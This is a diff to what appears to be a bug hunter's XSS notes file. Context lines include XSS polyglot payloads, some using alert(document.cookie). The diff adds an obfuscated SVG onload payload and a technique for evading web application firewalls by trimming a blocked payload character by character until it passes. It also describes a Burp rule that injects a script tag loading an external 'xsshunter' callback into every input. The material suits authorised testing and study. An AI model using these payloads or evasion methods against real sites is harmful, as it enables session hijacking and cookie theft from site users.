@@ -74,8 +74,19 @@ onerror=alert(document.cookie);>
 )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--
 !>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 
+<svg/onload=a=self['aler'%2B't']%3Ba(document.domain)>
+
 I set up a Burp match and replace rule that turns XXX into: '"><script src="xsshunter url"></script><h1>test
 Then I just put 'FooXXX' into everything I see, and see what happens. That'll find most trivial XSS and SQLi. Then I look at file uploads for SSRF and such.
+
+Bypassing WAF's
+However, the moment I put ?</script> (URL decoded here for readability) my request got immediately swatted down and blocked by the WAF. This was very much expected, however I eat WAFs for breakfast >:)
+Before trying to play against the WAF, we have to understand the rules of the game.
+A common mistake I see people make when trying to bypass WAFs, or just filters in general for the matter, is they copy and paste generic WAF bypass payloads without actually understanding why the WAF is blocking their requests. Spraying and praying WAFs is usually a waste of time from my experience, so it’s best to test them manually, and most importantly understand them
+So my first step when bypassing WAFs is to start out with a blocked payload and remove a character by character until the WAF lets me pass
+
+Luckily, it didn’t take us long to achieve an agreement with the WAF. All I had to do was remove the greater than > sign and I got a 200.
+
 
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
